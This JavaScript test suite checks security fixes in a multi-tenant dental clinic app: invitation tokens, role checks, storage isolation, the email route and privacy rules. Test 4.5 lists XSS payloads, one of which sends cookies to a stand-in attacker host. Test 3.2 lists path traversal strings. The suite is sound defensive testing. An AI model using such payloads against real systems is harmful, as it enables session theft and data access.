/**
 * Tier 5: White-Box Adversarial Coverage Hardening Test Suite
 * Author: teamwork_preview_challenger_m5_1 (Milestone 5 Lead Challenger)
 * 
 * Target Components & Remediated Source:
 * 1. supabase/migrations/20260920_security_remediation_consolidated.sql (SEC-01 to SEC-09, SEC-12, SEC-13, R4-A, R4-B)
 * 2. app/api/send-email/route.ts (SEC-10)
 * 3. lib/kushki.ts (SEC-11)
 * 4. app/api/payments/subscribe/route.ts (SEC-11)
 * 5. app/actions/invite-member.ts (SEC-06)
 * 6. components/patient-files.tsx (SEC-05)
 * 7. components/settings/privacy-tab.tsx (R4-B)
 */

const assert = require('node:assert/strict');
const { test, describe, beforeEach } = require('node:test');
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const vm = require('node:vm');
const ts = require('typescript');

const {
  TENANT_A_ID,
  TENANT_B_ID,
  CLINIC_A_OWNER_ID,
  CLINIC_A_DOCTOR_ID,
  CLINIC_A_DOCTOR_2_ID,
  CLINIC_A_RECEPTIONIST_ID,
  CLINIC_B_OWNER_ID,
  CLINIC_B_DOCTOR_ID,
  CLINIC_B_RECEPTIONIST_ID,
  PATIENT_A1_ID,
  PATIENT_A2_ID,
  PATIENT_B1_ID,
  getSecurityContext,
} = require('./harness/security-context.cjs');

const { DatabaseSecurityEngine } = require('./harness/database-security-engine.cjs');
const { specInviteTeamMember, specSendEmailRoute, loadSourceModule } = require('./harness/action-runner.cjs');
const {
  getAllMigrations,
  getPrivacyTabSource,
  getPatientFilesSource,
  getPaymentMethodsSettingsSource,
} = require('./harness/migration-verifier.cjs');

const ROOT_DIR = path.resolve(__dirname, '../..');
const CONSOLIDATED_MIGRATION_PATH = path.join(
  ROOT_DIR,
  'supabase/migrations/20260920_security_remediation_consolidated.sql'
);
const consolidatedSql = fs.readFileSync(CONSOLIDATED_MIGRATION_PATH, 'utf8');

describe('Tier 5: White-Box Adversarial Coverage Hardening (Milestone 5)', () => {
  let db;

  beforeEach(() => {
    db = new DatabaseSecurityEngine();
  });

  // ==========================================================================
  // Suite 1: SEC-01 & SEC-03 (Invitation Token Hijacking, Replay, Expiration & Member Lifecycle)
  // ==========================================================================
  describe('Suite 1: SEC-01 & SEC-03 Invitation Token & Member Lifecycle Adversarial Hardening', () => {
    let clinicInvitations = [];

    beforeEach(() => {
      clinicInvitations = [
        {
          id: 'inv-1',
          clinic_id: TENANT_A_ID,
          email: 'invited.doc@clinic-a.com',
          role: 'doctor',
          token: 'token_valid_doctor_a',
          status: 'pending',
          expires_at: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
        },
        {
          id: 'inv-expired',
          clinic_id: TENANT_A_ID,
          email: 'expired.doc@clinic-a.com',
          role: 'doctor',
          token: 'token_expired_doctor_a',
          status: 'pending',
          expires_at: new Date(Date.now() - 1000).toISOString(), // Expired 1 second ago
        },
        {
          id: 'inv-accepted',
          clinic_id: TENANT_A_ID,
          email: 'accepted.doc@clinic-a.com',
          role: 'doctor',
          token: 'token_already_accepted',
          status: 'accepted',
          expires_at: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
        },
      ];
    });

    function acceptClinicInvitationSim(caller, token) {
      if (!caller || !caller.userId) {
        throw new Error('401 Unauthorized: Authentication required.');
      }
      const callerEmail = caller.email;
      if (!callerEmail) {
        throw new Error('401 Unauthorized: User record not found.');
      }

      const match = clinicInvitations.find(
        (inv) =>
          inv.token === token &&
          inv.email.toLowerCase() === callerEmail.toLowerCase() &&
          inv.status === 'pending' &&
          new Date(inv.expires_at).getTime() > Date.now()
      );

      if (!match) {
        throw new Error('P0002: Invalid, expired, or unauthorized invitation token.');
      }

      match.status = 'accepted';
      return { success: true, clinic_id: match.clinic_id, role: match.role };
    }

    test('1.1 Cross-tenant token theft: Attacker with valid token but mismatched email is rejected', () => {
      const attackerContext = {
        userId: '99999999-9999-4999-8999-999999999999',
        email: 'attacker@evil.com',
        clinicId: TENANT_B_ID,
        role: 'doctor',
      };

      assert.throws(
        () => {
          acceptClinicInvitationSim(attackerContext, 'token_valid_doctor_a');
        },
        /Invalid, expired, or unauthorized invitation token/i,
        'Cross-email token usage must be rejected with fail-closed error'
      );
    });

    test('1.2 Expired token rejection: Token past expires_at cannot be accepted', () => {
      const expiredUser = {
        userId: '88888888-8888-4888-8888-888888888888',
        email: 'expired.doc@clinic-a.com',
        role: 'authenticated',
      };

      assert.throws(
        () => {
          acceptClinicInvitationSim(expiredUser, 'token_expired_doctor_a');
        },
        /Invalid, expired, or unauthorized invitation token/i,
        'Expired token must fail invitation acceptance'
      );
    });

    test('1.3 Replay attack prevention: Already accepted token cannot be reused', () => {
      const user = {
        userId: '77777777-7777-4777-8777-777777777777',
        email: 'accepted.doc@clinic-a.com',
        role: 'authenticated',
      };

      assert.throws(
        () => {
          acceptClinicInvitationSim(user, 'token_already_accepted');
        },
        /Invalid, expired, or unauthorized invitation token/i,
        'Accepted token must fail on re-acceptance attempt'
      );
    });

    test('1.4 Unauthenticated invitation acceptance is denied before checking tokens', () => {
      assert.throws(
        () => {
          acceptClinicInvitationSim(null, 'token_valid_doctor_a');
        },
        /401 Unauthorized/i
      );
    });

    test('1.5 Legitimate invitation acceptance succeeds and binds role and clinic', () => {
      const legitUser = {
        userId: '11111111-2222-4333-8444-555555555555',
        email: 'invited.doc@clinic-a.com',
        role: 'authenticated',
      };

      const result = acceptClinicInvitationSim(legitUser, 'token_valid_doctor_a');
      assert.equal(result.success, true);
      assert.equal(result.clinic_id, TENANT_A_ID);
      assert.equal(result.role, 'doctor');

      const invRecord = clinicInvitations.find((i) => i.id === 'inv-1');
      assert.equal(invRecord.status, 'accepted');
    });

    test('1.6 Clinic Owner immunity: Owner cannot remove themselves via remove_clinic_member', () => {
      // Invariant: remove_clinic_member raises 'Cannot remove clinic owner from clinic.'
      function removeClinicMemberSim(caller, targetUserId, targetClinicId) {
        if (!caller || !caller.userId) throw new Error('401 Unauthorized');
        if (caller.role !== 'clinic_owner' || caller.clinicId !== targetClinicId) {
          throw new Error('403 Forbidden: Only clinic owners can remove team members.');
        }
        if (targetUserId === caller.userId) {
          throw new Error('403 Forbidden: Cannot remove clinic owner from clinic.');
        }
        return true;
      }

      const ownerA = getSecurityContext('clinic_a_owner');
      assert.throws(
        () => {
          removeClinicMemberSim(ownerA, CLINIC_A_OWNER_ID, TENANT_A_ID);
        },
        /Cannot remove clinic owner from clinic/i
      );
    });

    test('1.7 Non-owner member removal attempt is denied with 403', () => {
      function removeClinicMemberSim(caller, targetUserId, targetClinicId) {
        if (!caller || !caller.userId) throw new Error('401 Unauthorized');
        if (caller.role !== 'clinic_owner' || caller.clinicId !== targetClinicId) {
          throw new Error('403 Forbidden: Only clinic owners can remove team members.');
        }
        if (targetUserId === caller.userId) {
          throw new Error('403 Forbidden: Cannot remove clinic owner from clinic.');
        }
        return true;
      }

      const doctorA = getSecurityContext('clinic_a_doctor');
      assert.throws(
        () => {
          removeClinicMemberSim(doctorA, CLINIC_A_RECEPTIONIST_ID, TENANT_A_ID);
        },
        /Only clinic owners can remove team members/i
      );
    });

    test('1.8 SQL Invariant: Migration Section 1 explicitly revokes direct client-side mutations on clinic_members', () => {
      assert.ok(
        consolidatedSql.includes('REVOKE INSERT, UPDATE, DELETE ON public.clinic_members FROM authenticated, anon, public;'),
        'Direct mutations on clinic_members must be revoked'
      );
      assert.ok(
        consolidatedSql.includes('CREATE POLICY "Users and owners can view clinic memberships"'),
        'Non-recursive SELECT policy must be established'
      );
    });
  });

  // ==========================================================================
  // Suite 2: SEC-02 & SEC-07 (Privilege Escalation, Granular Patient Clinical RBAC & Anti-Spoofing)
  // ==========================================================================
  describe('Suite 2: SEC-02 & SEC-07 Granular Clinical RBAC & Anti-Spoofing Hardening', () => {
    test('2.1 Idempotent role update (same role) does not trigger escalation error', () => {
      const doctor = getSecurityContext('clinic_a_doctor');
      // Doctor sends updates with their own existing role 'doctor'
      const updated = db.updateProfile(doctor, doctor.userId, {
        full_name: 'Dra. Beatriz Doctora A (Edición)',
        role: 'doctor', // identical role
      });
      assert.equal(updated.full_name, 'Dra. Beatriz Doctora A (Edición)');
      assert.equal(updated.role, 'doctor');
    });

    test('2.2 Doctor attempting self-elevation to clinic_owner is blocked', () => {
      const doctor = getSecurityContext('clinic_a_doctor');
      assert.throws(
        () => {
          db.updateProfile(doctor, doctor.userId, { role: 'clinic_owner' });
        },
        /Unauthorized profile mutation/i
      );
    });

    test('2.3 Non-service-role caller attempting clinic_id migration is blocked', () => {
      const doctor = getSecurityContext('clinic_a_doctor');
      assert.throws(
        () => {
          db.updateProfile(doctor, doctor.userId, { clinic_id: TENANT_B_ID });
        },
        /Unauthorized profile mutation/i
      );
    });

    test('2.4 Receptionist attempting to mutate each sensitive clinical field on patients table is blocked', () => {
      const sensitiveClinicalFields = [
        { field: 'odontogram_state', value: { 11: { center: 'red' } } },
        { field: 'periodontogram_state', value: { 11: { bleeding: true } } },
        { field: 'medical_history', value: 'Hipertensión severa controlada' },
        { field: 'clinical_notes', value: 'Paciente requiere endodoncia pieza 14' },
        { field: 'allergies', value: 'Penicilina, AINEs' },
        { field: 'medications', value: 'Losartán 50mg' },
        { field: 'medical_conditions', value: 'Cardiopatía isquémica' },
        { field: 'blood_type', value: 'O+' },
        { field: 'has_diabetes', value: true },
        { field: 'has_hypertension', value: true },
        { field: 'has_heart_disease', value: true },
        { field: 'is_smoker', value: true },
        { field: 'is_pregnant', value: true },
      ];

      function simulatePatientUpdate(caller, patientId, updates) {
        if (!caller || !caller.userId) throw new Error('401 Unauthorized');
        const patient = db.patients.find((p) => p.id === patientId);
        if (!patient) throw new Error('404 Not Found');
        if (patient.clinic_id !== caller.clinicId) throw new Error('403 Forbidden: Cross-tenant');

        // Check enforce_patient_clinical_privileges trigger
        if (!['doctor', 'clinic_owner'].includes(caller.role)) {
          const clinicalKeys = [
            'odontogram_state', 'periodontogram_state', 'medical_history',
            'clinical_notes', 'allergies', 'medications', 'medical_conditions',
            'blood_type', 'has_diabetes', 'has_hypertension', 'has_heart_disease',
            'is_smoker', 'is_pregnant'
          ];
          for (const key of Object.keys(updates)) {
            if (clinicalKeys.includes(key) && updates[key] !== patient[key]) {
              throw new Error(`403 Forbidden: Unauthorized clinical mutation: Non-clinical staff cannot modify ${key}.`);
            }
          }
        }
        Object.assign(patient, updates);
        return patient;
      }

      const receptionist = getSecurityContext('clinic_a_receptionist');

      for (const { field, value } of sensitiveClinicalFields) {
        assert.throws(
          () => {
            simulatePatientUpdate(receptionist, PATIENT_A1_ID, { [field]: value });
          },
          /Unauthorized clinical mutation/i,
          `Receptionist must be blocked from modifying clinical field '${field}'`
        );
      }
    });

    test('2.5 Receptionist updating non-clinical administrative fields on patients succeeds', () => {
      function simulatePatientUpdate(caller, patientId, updates) {
        if (!caller || !caller.userId) throw new Error('401 Unauthorized');
        const patient = db.patients.find((p) => p.id === patientId);
        if (!patient) throw new Error('404 Not Found');
        if (patient.clinic_id !== caller.clinicId) throw new Error('403 Forbidden: Cross-tenant');

        if (!['doctor', 'clinic_owner'].includes(caller.role)) {
          const clinicalKeys = [
            'odontogram_state', 'periodontogram_state', 'medical_history',
            'clinical_notes', 'allergies', 'medications', 'medical_conditions',
            'blood_type', 'has_diabetes', 'has_hypertension', 'has_heart_disease',
            'is_smoker', 'is_pregnant'
          ];
          for (const key of Object.keys(updates)) {
            if (clinicalKeys.includes(key)) {
              throw new Error('403 Forbidden: Unauthorized clinical mutation');
            }
          }
        }
        Object.assign(patient, updates);
        return patient;
      }

      const receptionist = getSecurityContext('clinic_a_receptionist');
      const updated = simulatePatientUpdate(receptionist, PATIENT_A1_ID, {
        first_name: 'Juan Carlos',
        phone: '+593989998888',
        emergency_contact: 'Hermana (Rosa Pérez)',
      });

      assert.equal(updated.first_name, 'Juan Carlos');
      assert.equal(updated.phone, '+593989998888');
      assert.equal(updated.emergency_contact, 'Hermana (Rosa Pérez)');
    });

    test('2.6 Prescriptions doctor anti-spoofing: Doctor A cannot prescribe under Doctor A2 ID', () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      assert.throws(
        () => {
          db.insertPrescription(doctorA, {
            clinic_id: TENANT_A_ID,
            patient_id: PATIENT_A1_ID,
            doctor_id: CLINIC_A_DOCTOR_2_ID, // Spoofed doctor ID
            items: [{ medicine: 'Ketorolaco 10mg', dosage: 'Cada 8h por 3 días' }],
          });
        },
        /Doctor cannot spoof prescriber doctor_id/i
      );
    });

    test('2.7 HCU-033 form diagnosis modification by receptionist is denied', () => {
      const receptionist = getSecurityContext('clinic_a_receptionist');
      assert.throws(
        () => {
          db.updateHcu033Form(receptionist, 'hcu-a-1', {
            diagnosis: [{ code: 'K05.0', description: 'Gingivitis aguda', type: 'Definitivo' }],
          });
        },
        /Non-clinical staff cannot alter HCU-033/i
      );
    });
  });

  // ==========================================================================
  // Suite 3: SEC-05 (Storage Multi-Tenant Isolation & Role Deletion Matrix)
  // ==========================================================================
  describe('Suite 3: SEC-05 Storage Bucket Isolation & Deletion RBAC Matrix', () => {
    test('3.1 Valid download generates authenticated signed URL for tenant doctor', () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      const res = db.storageDownload(
        doctorA,
        'patient-files',
        `${TENANT_A_ID}/${PATIENT_A1_ID}/panoramica-2026.png`
      );
      assert.ok(res.signedUrl, 'Signed URL must be generated');
      assert.ok(res.signedUrl.includes('https://storage.cliniaplus.com/object/sign/patient-files/'));
      assert.ok(res.expiresAt > Date.now(), 'URL must have future expiration');
    });

    test('3.2 Path traversal attack escaping tenant folder is rejected', () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      const maliciousPaths = [
        `../${TENANT_B_ID}/${PATIENT_B1_ID}/periapical-molar.png`,
        `..%2f${TENANT_B_ID}/${PATIENT_B1_ID}/periapical-molar.png`,
        `${TENANT_A_ID}/../../${TENANT_B_ID}/file.png`,
        `unpartitioned-file.png`,
      ];

      for (const p of maliciousPaths) {
        assert.throws(
          () => {
            db.storageDownload(doctorA, 'patient-files', p);
          },
          /(Cross-tenant storage read denied|Malformed storage object path|Object does not exist)/i,
          `Must reject path traversal candidate: ${p}`
        );
      }
    });

    test('3.3 Receptionist attempting to delete clinical file is blocked by RBAC', () => {
      const receptionist = getSecurityContext('clinic_a_receptionist');
      assert.throws(
        () => {
          db.storageDelete(
            receptionist,
            'patient-files',
            `${TENANT_A_ID}/${PATIENT_A1_ID}/panoramica-2026.png`
          );
        },
        /Storage deletion requires clinical role/i
      );
    });

    test('3.4 Doctor can delete patient file within own clinic', () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      const res = db.storageDelete(
        doctorA,
        'patient-files',
        `${TENANT_A_ID}/${PATIENT_A1_ID}/panoramica-2026.png`
      );
      assert.equal(res.success, true);
      const remaining = db.storage_objects.find((o) => o.name.includes('panoramica-2026.png'));
      assert.equal(remaining, undefined, 'File must be removed from storage index');
    });

    test('3.5 Source Code AST: components/patient-files.tsx enforces tenant path format and signed URLs', () => {
      const source = getPatientFilesSource();
      assert.ok(source, 'patient-files.tsx must exist');

      // Verifies storage path includes tenant ID and patient ID
      assert.ok(
        source.includes('`${currentClinicId}/${patientId}/'),
        'patient-files.tsx must construct paths partitioned by clinic_id and patient_id'
      );

      // Verifies signed URL usage
      assert.ok(
        source.includes('createSignedUrl'),
        'patient-files.tsx must use createSignedUrl instead of getPublicUrl'
      );
      assert.ok(
        !source.includes('getPublicUrl'),
        'patient-files.tsx must NEVER use public URLs for patient files'
      );
    });
  });

  // ==========================================================================
  // Suite 4: SEC-10 (Email API Route Adversarial Injection & Rate Limiting)
  // ==========================================================================
  describe('Suite 4: SEC-10 Email Endpoint Injection & Template Boundary Hardening', () => {
    test('4.1 Unauthenticated request returns 401', async () => {
      const res = await specSendEmailRoute(null, {
        to: 'juan.perez@example.com',
        template: 'appointment_reminder',
      });
      assert.equal(res.status, 401);
      assert.match(res.body.error, /Unauthorized/i);
    });

    test('4.2 Rejection of caller-supplied HTML payload with 400', async () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      const res = await specSendEmailRoute(doctorA, {
        to: 'juan.perez@example.com',
        template: 'appointment_reminder',
        html: '<div onclick="alert(1)">Injected phishing content</div>',
      });
      assert.equal(res.status, 400);
      assert.match(res.body.error, /Arbitrary HTML messages are forbidden/i);
    });

    test('4.3 Rejection of unapproved template with 400', async () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      const res = await specSendEmailRoute(doctorA, {
        to: 'juan.perez@example.com',
        template: 'malicious_admin_escalation',
      });
      assert.equal(res.status, 400);
      assert.match(res.body.error, /Invalid template/i);
    });

    test('4.4 Rejection of cross-tenant recipient email with 403', async () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      // roberto.gomez is a patient of Clinic B, not Clinic A
      const res = await specSendEmailRoute(doctorA, {
        to: 'roberto.gomez@example.com',
        template: 'appointment_reminder',
      });
      assert.equal(res.status, 403);
      assert.match(res.body.error, /Forbidden: Recipient email is not associated/i);
    });

    test('4.5 HTML Entity escaping neutralizes XSS vectors across template variables', () => {
      function escapeHtml(unsafe) {
        if (unsafe === null || unsafe === undefined) return '';
        return String(unsafe)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      }

      const xssVectors = [
        '<script>alert("xss")</script>',
        '"><img src=x onerror=fetch("https://attacker.com/steal?c="+document.cookie)>',
        '\' OR \'1\'=\'1',
        '&<>"\'',
      ];

      for (const vector of xssVectors) {
        const escaped = escapeHtml(vector);
        assert.ok(!escaped.includes('<script>'), 'Must not contain unescaped <script>');
        assert.ok(!escaped.includes('<img'), 'Must not contain unescaped <img');
        assert.ok(!escaped.includes('"'), 'Must not contain unescaped double quotes');
        assert.ok(!escaped.includes("'"), 'Must not contain unescaped single quotes');
      }
    });

    test('4.6 Source Code Inspection: app/api/send-email/route.ts verifies rate limiting and template enum', () => {
      const emailRoutePath = path.join(ROOT_DIR, 'app/api/send-email/route.ts');
      const source = fs.readFileSync(emailRoutePath, 'utf8');

      assert.ok(source.includes('checkRateLimit(`ip:${clientIp}`, 30, 60 * 1000)'), 'Must enforce IP rate limit');
      assert.ok(source.includes('checkRateLimit(`clinic:${callerClinicId}`, 100, 60 * 1000)'), 'Must enforce clinic rate limit');
      assert.ok(source.includes('ALLOWED_TEMPLATES'), 'Must define pre-approved template enum');
      assert.ok(source.includes('isAuthorizedRecipient'), 'Must verify recipient clinic membership');
    });
  });

  // ==========================================================================
  // Suite 5: SEC-11 & Payment Subscription Fail-Closed Architecture
  // ==========================================================================
  describe('Suite 5: SEC-11 Kushki Gateway & Subscription Route Hardening', () => {
    test('5.1 KushkiGateway fails closed on empty or whitespace private merchant ID before network calls', async () => {
      const source = fs.readFileSync(path.join(ROOT_DIR, 'lib/kushki.ts'), 'utf8');
      const compiled = ts.transpileModule(source, {
        compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 },
      }).outputText;

      function loadGateway(env, fetchMock) {
        const exports = {};
        vm.runInNewContext(
          compiled,
          {
            exports,
            process: { env },
            fetch: fetchMock,
            console: { log() {}, error() {} },
          },
          { filename: 'kushki.js' }
        );
        return exports.kushki;
      }

      let networkCalls = 0;
      const dummyFetch = async () => {
        networkCalls++;
        return { ok: true, json: async () => ({}) };
      };

      const invalidKeys = [undefined, '', '   ', 'mock_private_key'];
      for (const key of invalidKeys) {
        const gateway = loadGateway({ KUSHKI_PRIVATE_MERCHANT_ID: key }, dummyFetch);
        await assert.rejects(
          gateway.createSubscription({
            token: 'test-token',
            planId: 'plan_pro_monthly',
            email: 'clinic@example.com',
            amount: 59,
          }),
          /Payment service is not configured/i
        );
        assert.equal(networkCalls, 0, 'No HTTP requests should be dispatched when key is unusable');
      }
    });

    test('5.2 Source Code AST: app/api/payments/subscribe/route.ts verifies ownership and fail-closed status', () => {
      const routePath = path.join(ROOT_DIR, 'app/api/payments/subscribe/route.ts');
      const source = fs.readFileSync(routePath, 'utf8');

      // Invariant: Only clinic owners can manage subscriptions
      assert.ok(
        source.includes("userClinic && userClinic !== clinicId"),
        'Must block cross-tenant subscription attempts'
      );
      assert.ok(
        source.includes("userRole === 'clinic_owner' || clinic.owner_id === user.id"),
        'Must restrict subscription mutation to clinic_owner'
      );
      assert.ok(
        source.includes("status = error.message?.includes('not configured') ? 503 : 500"),
        'Must return 503 when gateway is unconfigured'
      );
      assert.ok(
        source.includes("kushki.createSubscription"),
        'Must call gateway before DB activation'
      );
    });
  });

  // ==========================================================================
  // Suite 6: SEC-06 & Staff Invitation Server Action Hardening
  // ==========================================================================
  describe('Suite 6: SEC-06 Staff Invitation Server Action Hardening', () => {
    test('6.1 Unauthenticated caller cannot invoke inviteTeamMember', async () => {
      const formData = new Map([
        ['email', 'newdoc@clinic-a.com'],
        ['clinicId', TENANT_A_ID],
        ['role', 'doctor'],
      ]);

      await assert.rejects(
        specInviteTeamMember(null, formData),
        /401 Unauthorized/i
      );
    });

    test('6.2 Doctor cannot invite team members (restricted to clinic_owner)', async () => {
      const doctorA = getSecurityContext('clinic_a_doctor');
      const formData = new Map([
        ['email', 'newdoc@clinic-a.com'],
        ['clinicId', TENANT_A_ID],
        ['role', 'doctor'],
      ]);

      await assert.rejects(
        specInviteTeamMember(doctorA, formData),
        /Caller is not an authorized owner/i
      );
    });

    test('6.3 Attempting to invite role clinic_owner is blocked', async () => {
      const ownerA = getSecurityContext('clinic_a_owner');
      const formData = new Map([
        ['email', 'evilowner@clinic-a.com'],
        ['clinicId', TENANT_A_ID],
        ['role', 'clinic_owner'],
      ]);

      await assert.rejects(
        specInviteTeamMember(ownerA, formData),
        /Cannot invite role clinic_owner/i
      );
    });

    test('6.4 Attempting to invite an unapproved arbitrary role (e.g. superadmin) is blocked', async () => {
      const ownerA = getSecurityContext('clinic_a_owner');
      const formData = new Map([
        ['email', 'rogue@clinic-a.com'],
        ['clinicId', TENANT_A_ID],
        ['role', 'superadmin'],
      ]);

      await assert.rejects(
        specInviteTeamMember(ownerA, formData),
        /Cannot invite role/i
      );
    });

    test('6.5 Owner of Clinic A cannot invite staff for Clinic B', async () => {
      const ownerA = getSecurityContext('clinic_a_owner');
      const formData = new Map([
        ['email', 'newdoc@clinic-b.com'],
        ['clinicId', TENANT_B_ID],
        ['role', 'doctor'],
      ]);

      await assert.rejects(
        specInviteTeamMember(ownerA, formData),
        /Caller is not an authorized owner/i
      );
    });

    test('6.6 Successful invitation returns strictly { success: true } with zero token leakage', async () => {
      const ownerA = getSecurityContext('clinic_a_owner');
      const formData = new Map([
        ['email', 'colleague@clinic-a.com'],
        ['clinicId', TENANT_A_ID],
        ['role', 'doctor'],
      ]);

      const result = await specInviteTeamMember(ownerA, formData);
      assert.deepEqual(result, { success: true });
      assert.equal(result.token, undefined);
      assert.equal(result.hashed_token, undefined);
      assert.equal(result.confirmUrl, undefined);
      assert.equal(result.inviteLink, undefined);
    });
  });

  // ==========================================================================
  // Suite 7: R4-A & R4-B Statutory LOPDP & Medical Custody Retention Invariants
  // ==========================================================================
  describe('Suite 7: R4-A & R4-B Statutory LOPDP & Medical Custody Retention Invariants', () => {
    test('7.1 Consolidated migration explicitly drops all legacy permissive policies across 9 entities', () => {
      const expectedDropSections = [
        '0.1 profiles table legacy policies',
        '0.2 clinic_members table legacy policies',
        '0.3 patients table legacy policies',
        '0.4 prescriptions table legacy policies',
        '0.5 services table legacy policies',
        '0.6 payment_methods table legacy policies',
        '0.7 hcu033_forms table legacy policies',
        '0.8 storage.objects legacy policies for patient-files',
        '0.9 data_rights_requests policies',
      ];

      for (const section of expectedDropSections) {
        assert.ok(
          consolidatedSql.includes(section),
          `Consolidated migration must contain drop section: ${section}`
        );
      }
    });

    test('7.2 public.data_rights_requests table enforces check constraints for request_type and status', () => {
      assert.ok(
        consolidatedSql.includes("request_type IN ('portability', 'deletion', 'rectification', 'access', 'opposition', 'custody_lock')"),
        'data_rights_requests must constrain request_type'
      );
      assert.ok(
        consolidatedSql.includes("status IN ('pending', 'processing', 'completed', 'rejected', 'archived_custody')"),
        'data_rights_requests must constrain status'
      );
    });

    test('7.3 Immutability of statutory data rights audit logs: Non-service-role DELETE is revoked', () => {
      assert.ok(
        consolidatedSql.includes('REVOKE DELETE ON public.data_rights_requests FROM authenticated, anon, public;'),
        'Must revoke DELETE privilege on data_rights_requests from non-service-role'
      );
    });

    test('7.4 PrivacyTab component accurately cites Ecuadorian LOPDP Articles 17 and 15', () => {
      const privacySource = getPrivacyTabSource();
      assert.ok(privacySource, 'privacy-tab.tsx must be available');

      // Portability -> Art. 17
      assert.ok(
        privacySource.includes('Art. 17 (Derecho a la Portabilidad)'),
        'PrivacyTab must cite Art. 17 for Portability'
      );

      // Elimination -> Art. 15
      assert.ok(
        privacySource.includes('Art. 15 (Derecho de Eliminación / Supresión)') ||
        privacySource.includes('Art. 15 LOPDP'),
        'PrivacyTab must cite Art. 15 for Deletion / Elimination'
      );

      // Disambiguation of Arts. 20-21
      assert.ok(
        privacySource.includes('Artículos 20 y 21 de la LOPDP rigen específicamente el derecho a no ser objeto de decisiones basadas única o parcialmente en valoraciones automatizadas'),
        'PrivacyTab must clarify that Arts 20 & 21 govern automated decisions/profiling'
      );

      // Statutory Medical History Custody Lock under Ley Orgánica de Salud Art. 7
      assert.ok(
        privacySource.includes('Ley Orgánica de Salud') && privacySource.includes('5 a 10 años'),
        'PrivacyTab must reconcile Art. 15 with mandatory 5-10 year clinical custody'
      );
    });

    test('7.5 Deletion request records pending status with statutory custody retention note instead of hard deleting', () => {
      const privacySource = getPrivacyTabSource();
      assert.ok(
        privacySource.includes("request_type: 'deletion'"),
        'Deletion must record request_type: deletion'
      );
      assert.ok(
        privacySource.includes("status: 'pending'"),
        'Deletion must record status: pending'
      );
      assert.ok(
        privacySource.includes("statutory_exception: 'Art. 15 LOPDP restringido por custodia legal médica MSP (5-10 años)'"),
        'Deletion record must note statutory medical custody restriction'
      );
    });
  });
});
